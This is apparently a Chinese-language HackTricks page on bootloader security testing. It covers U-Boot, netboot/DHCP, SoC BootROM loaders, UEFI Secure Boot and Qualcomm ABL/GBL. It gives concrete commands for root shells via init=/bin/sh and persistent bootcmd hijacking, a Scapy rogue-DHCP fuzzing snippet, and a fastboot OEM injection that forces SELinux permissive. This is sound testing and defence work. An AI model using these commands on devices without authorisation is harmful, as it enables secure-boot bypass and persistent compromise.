# Bootloader 测试

{{#include ../../banners/hacktricks-training.md}}

建议按照以下步骤修改设备启动配置，并测试 U-Boot 和 UEFI 类加载器等 bootloader。重点是获取早期代码执行权限、评估签名/回滚保护，并滥用恢复或网络启动路径。

相关内容：通过修补 bl2_ext 绕过 MediaTek 安全启动：

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 快速入门与环境滥用

1. 访问解释器 shell
   - 启动期间，在 `bootcmd` 执行前按下已知的中断键（通常是任意键、0、空格，或特定于开发板的“magic”按键序列），进入 U-Boot 提示符。<sup>[[1]](#references)</sup>

2. 检查启动状态和变量
   - 实用命令：
     - `printenv`（转储环境变量）
     - `bdinfo`（开发板信息、内存地址）
     - `help bootm; help booti; help bootz`（支持的内核启动方法）
     - `help ext4load; help fatload; help tftpboot`（可用的加载器）

3. 修改启动参数以获取 root shell
   - 附加 `init=/bin/sh`，让内核进入 shell，而不是正常启动 init：
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. 从你的 TFTP server 进行 Netboot
   - 配置网络并从 LAN 获取 kernel/fit image：
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 通过环境变量持久化更改
   - 如果 env 存储未启用写保护，你就可以持久化控制权：
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - 检查影响回退路径的变量，如 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets`。配置错误的值可能导致反复进入 shell。

6. 检查调试/不安全功能
   - 查找：`bootdelay` > 0、禁用 `autoboot`、不受限制的 `usb start; fatload usb 0:1 ...`、通过串口使用 `loady`/`loads` 的能力、从不可信介质执行 `env import`，以及未经过签名检查就加载的内核/ramdisk。

7. U-Boot 镜像/验证测试
   - 如果平台声称使用 FIT 镜像实现 secure/verified boot，请同时测试未签名和被篡改的镜像：
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 或采用旧版 `verify=n` 行为，通常会允许启动任意 payload。
   - 不要只停留在简单的允许/拒绝结果：近期的 FIT 研究表明，验证路径本身也可能是预认证攻击面。对外部存储的 FIT 数据（`data-offset`、`data-position`、`data-size`）、签名配置选择、`loadables` 以及 overlay / `extra-conf` 处理进行负向测试。
   - 如果你有匹配的源代码树，`test/vboot/vboot_test.sh` 可以让你在接触真实硬件前，快速在 U-Boot sandbox 中复现 FIT 验证行为。<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`)、`extlinux` 和脚本 bootflow
   - 在较新的 U-Boot 构建中，`bootcmd` 通常只是 Standard Boot 的包装器。这意味着，即使可见的环境看起来无害，可写介质、PXE 或 SPI flash 也可能成为真正的信任边界。
   - `extlinux` bootmeth 会在 `/` 和 `/boot` 下搜索 `extlinux/extlinux.conf`；脚本 bootmeth 会先搜索 `boot.scr.uimg`，然后搜索 `boot.scr`。在网络启动时，脚本文件名可能来自 `boot_script_dhcp`。
   - 有用的初步排查命令：
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - 要测试的滥用场景：攻击者控制的 USB/SD 媒体在 `boot_targets` 中优先级更高、`/boot/extlinux/extlinux.conf` 可写、恶意 TFTP 服务器提供 `boot.scr`，或通过 SPI 执行脚本（`script_offset_f`）。
   - 如果平台依赖 FIT verification，请确保配置是在配置级别签名，而不只是对每个镜像单独签名；`required-mode=all` 比接受任意一个必需密钥更安全。

## 网络启动攻击面（DHCP/PXE）和恶意服务器

9. PXE/DHCP 参数模糊测试
   - U-Boot 的旧版 BOOTP/DHCP 处理曾出现内存安全问题。例如，CVE‑2024‑42040 描述了通过精心构造的 DHCP 响应泄露内存的漏洞，可能将 U-Boot 内存中的字节泄露到网络上。<sup>[[4]](#references)</sup> 使用过长或边界情况的值测试 DHCP/PXE 代码路径（选项 67 bootfile-name、厂商选项、file/servername 字段），并观察是否出现挂起或泄露。
   - 用于在网络启动期间测试启动参数的最小 Scapy 代码片段：
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - 另外，验证 PXE filename 字段在传递给 shell/loader 逻辑并串接到 OS 端配置脚本时，是否未经清理。

10. Rogue DHCP server 命令注入测试
   - 搭建 rogue DHCP/PXE 服务，尝试在 filename 或 options 字段中注入字符，以便在启动链后续阶段触发命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq` 或自定义 Scapy 脚本都很适用。请先隔离实验网络。

## 可覆盖正常启动流程的 SoC ROM 恢复模式

许多 SoC 提供 BootROM“loader”模式，即使 flash 镜像无效，也可通过 USB/UART 接收代码。如果 secure-boot 熔丝尚未烧录，这种模式可能让攻击者在启动链很早阶段获得任意代码执行。

- NXP i.MX（Serial Download Mode）
  - 工具：`uuu`（mfgtools3）或 `imx-usb-loader`。
  - 示例：`imx-usb-loader u-boot.imx`，将自定义 U-Boot 推送到 RAM 并运行。
- Allwinner（FEL）
  - 工具：`sunxi-fel`。
  - 示例：`sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 或 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
  - 工具：`rkdeveloptool`。
  - 示例：`rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`，暂存一个 loader 并上传自定义 U-Boot。

评估设备的 secure-boot eFuses/OTP 是否已烧录。如果没有，BootROM 下载模式通常可绕过更高层的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC 类 bootloader：快速检查

11. ESP 篡改、回滚和密钥注册测试
   - 挂载 EFI System Partition（ESP），检查 loader 组件：`EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、厂商 logo 路径。
   - 在可能的情况下，从 OS 中导出 Secure Boot 状态和密钥数据库：
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - 如果平台处于 Setup Mode、接受未经身份验证的密钥注册，或出厂时使用测试/默认 Platform Key（PKfail 类），本地管理员或拥有物理访问权限的攻击者就可以注册自己的 KEK/db，同时让 Secure Boot 看起来仍处于“启用”状态，却能启动任意 EFI 二进制文件。<sup>[[3]](#references)</sup>
   - 如果 Secure Boot 撤销列表（dbx）不是最新版本，尝试使用降级或已知存在漏洞的签名启动组件启动。如果平台仍信任旧版 shim/bootmanager，通常可以从 ESP 加载自己的内核或 `grub.cfg`，以获得持久化。

12. 过时 shim / SBAT / dbx 撤销测试
   - 如果撤销列表过时，旧版 Microsoft 签名 shim 和厂商分支仍可能成为 BYOVD 风格 bootkit 的攻击途径。在隔离实验室中，将历史上存在漏洞的 shim 放到 ESP 上，并尝试 chainload 自己的 `grubx64.efi` 或内核。<sup>[[11]](#references)</sup>
   - 快速分诊：
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - 如果 shim 尽管已列入撤销列表仍能运行，说明固件/OS 的 `dbx` 更新已过时，或信任一个从未继承上游 SBAT 保护的分叉 loader。

13. Boot logo 解析漏洞（LogoFAIL 类）
   - 多家 OEM/IBV 固件在处理 boot logo 的 DXE 镜像解析中存在漏洞。如果攻击者能将特制镜像放在 ESP 的厂商特定路径下（例如 `\EFI\<vendor>\logo\*.bmp`）并重启，即使启用了 Secure Boot，也可能在早期启动阶段实现代码执行。测试平台是否接受用户提供的 logo，以及这些路径是否可从 OS 写入。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) 信任缺口

对于使用 Qualcomm 的 ABL 加载 **Generic Bootloader Library (GBL)** 的 Android 16 设备，请验证 ABL 是否会对从 `efisp` 分区加载的 UEFI app 进行**身份验证**。如果 ABL 只检查 UEFI app 是否**存在**，而不验证签名，那么对 `efisp` 的 write primitive 就会造成启动时的 **OS 前无签名代码执行**。<sup>[[6]](#references)[[7]](#references)</sup>

实用检查与利用途径：

- **efisp write primitive**：需要一种方法将自定义 UEFI app 写入 `efisp`（root/特权服务、OEM app 漏洞、recovery/fastboot 路径）。如果没有这种方法，就无法直接触及 GBL 加载缺口。<sup>[[6]](#references)</sup>
- **fastboot OEM 参数注入**（ABL 漏洞）：某些构建版本会接受 `fastboot oem set-gpu-preemption` 中的额外 token，并将其追加到 kernel cmdline。利用这一点可以强制启用宽松的 SELinux，从而写入受保护分区：
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  如果设备已打补丁，该命令应拒绝额外参数。<sup>[[5]](#references)[[6]](#references)</sup>
- **通过持久标志解锁 bootloader**：boot 阶段的 payload 可以翻转持久解锁标志（例如 `is_unlocked=1`、`is_unlocked_critical=1`），从而绕过 OEM 服务器/审批门槛，模拟 `fastboot oem unlock`。下次重启后，这种状态更改仍会保留。<sup>[[6]](#references)</sup>

防御/初步排查提示：

- 确认 ABL 是否会对来自 `efisp` 的 GBL/UEFI payload 执行签名验证。如果不会，应将 `efisp` 视为高风险持久化攻击面。
- 检查 ABL fastboot OEM 处理程序是否已打补丁，以**验证参数数量**并拒绝额外 token。<sup>[[8]](#references)[[9]](#references)</sup>

## 硬件注意事项

在早期启动期间与 SPI/NAND flash 交互时（例如通过接地引脚绕过读取），务必谨慎，并始终查阅 flash 数据手册。短接时机不当可能损坏设备或编程器。

## 备注和其他提示

- 尝试使用 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 与存储设备之间移动环境变量数据块；某些平台允许从可移动介质导入 env，且无需身份验证。
- 对于通过 `extlinux.conf` 启动的基于 Linux 的系统，如果没有执行签名检查，通常只需修改启动分区上的 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）即可实现持久化。
- 如果目标设备采用双槽位/A/B 更新，请查看 [firmware analysis overview](README.md) 中的 anti-rollback 和 slot-desync 技术，以免遗漏 bootloader 本身之外、仅存在于 updater 中的信任缺口。
- 如果 userland 提供 `fw_printenv/fw_setenv`，请确认 `/etc/fw_env.config` 与实际的 env 存储配置相符。偏移量配置错误可能导致你读写错误的 MTD 区域。

## References

- [1] [Firmware 安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [发现 LogoFAIL：系统启动期间图像解析的危险](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail：不受信任的平台密钥如何削弱 UEFI 生态系统中的 Secure Boot](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 详情](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [抢先解锁：通过两个未净化字符串解锁 Xiaomi](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL 漏洞允许攻击者解锁 bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) 架构](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg：修复不受信任输入传入内核命令行的问题](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg：为 set-hw-fence-value 命令添加检查](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [无法启动：破坏 U-Boot 的 FIT 签名验证](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [漏洞通告 VU#616257 - 由 Microsoft 签名的 UEFI shim bootloader 易受 Secure Boot 绕过攻击](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
